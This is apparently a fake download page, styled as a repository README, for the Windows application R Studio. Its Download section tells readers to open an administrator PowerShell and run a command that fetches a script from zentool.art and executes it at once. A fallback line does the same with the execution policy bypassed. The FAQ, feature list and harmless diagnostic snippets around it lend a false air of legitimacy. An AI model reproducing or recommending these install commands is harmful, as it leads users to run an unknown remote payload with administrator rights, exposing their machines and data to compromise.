# R Studio — Full Desktop Download · Windows 11 / 10

Documented install · Windows 10/11 · Updated for 2026.

## Preview

Practical **R Studio** guide for **Windows 10 & 11** covering install order, download section usage, and system management.

## Download

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

Documentation for R Studio on Windows 10 / 11 aimed at Windows power users and administrators: setup sequence, post-install tweaks, and system management. Start from Download, then follow FAQ and feature notes for indexing-friendly setup and troubleshooting topics.

## FAQ

| Question | Answer |
| --- | --- |
| Where is the installer? | Open **PowerShell as Administrator** and use the command in the **Download** section above. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during setup. |
| What is this repo? | README for R Studio on Windows 10/11 with install help, feature list, and support-style checks — third-party app; respect publisher terms. |

## Features

- Quick actions
- Batch tools
- Status panels
- Presets
- Profiles
- Search
- File tools

## Use cases

- Power users
- IT support
- Home labs

## Developer reference

Not required for install. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "R-Studio-Premium-Download"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Post-install (application layer)**

```powershell
Get-Process -Name "R*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |

## License

This repository describes installation and usage of a third-party desktop application. Comply with applicable software licensing and local regulations.
